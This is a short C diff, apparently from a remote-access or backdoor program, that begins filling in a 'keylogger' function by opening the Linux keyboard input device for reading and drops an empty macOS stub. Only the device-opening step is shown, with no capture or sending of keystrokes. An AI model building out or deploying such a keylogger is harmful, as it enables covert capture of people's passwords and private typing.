@@ -82,13 +82,16 @@ void retrieveFile(char *fileName)
 
 void keylogger()
 {
-#ifdef __APPLE__
-    // Apple keylogger code will go here
-    
-#endif
 #ifdef __linux__
-    // Linux keylogger code will go here
+    int keyboard = 0;
     
+    // Open the keyboard input device for listening
+    keyboard = open(KEYBOARD_DEVICE, O_RDONLY | O_NOCTTY);
+    if (keyboard == -1)
+    {
+        systemFatal("Unable to keyboard");
+        return;
+    }
 #endif
 }
 
